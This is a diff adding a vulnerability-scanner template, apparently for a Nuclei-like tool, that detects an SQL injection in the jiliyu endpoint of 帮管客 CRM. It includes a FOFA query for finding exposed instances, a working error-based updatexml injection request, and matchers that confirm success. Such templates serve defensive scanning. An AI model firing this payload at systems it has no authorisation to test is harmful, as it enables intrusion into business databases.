@@ -1,0 +1,23 @@
+## id: VEID-2024-0401
+## name: 帮管客CRM-jiliyu接口存在SQL漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2024
+## description: 帮管客CRM客户管理系统专注于为企业提供crm客户关系管理、crm管理系统、crm软件产品及企业销售管理流程解决方案服务,助力企业业绩增长。帮管客CRM jiliyu接口存在SQL漏洞
+## fofa-query: "帮管客-CRM"
+## verification: true
+
+
+GET /index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7f,(select%20md5(1)),0x7f),1)) HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ matcher: status_code == 500
+#@ matcher: body contains "Database" && body contains "XPATH syntax error"  && body contains "select * from"
+
+
+
+
+
+# @VEIL-STAMP: 28d883abfbad882cf3f0c7fda4c5dc6443ac6f85f5dee5078c287cac7e257b6a
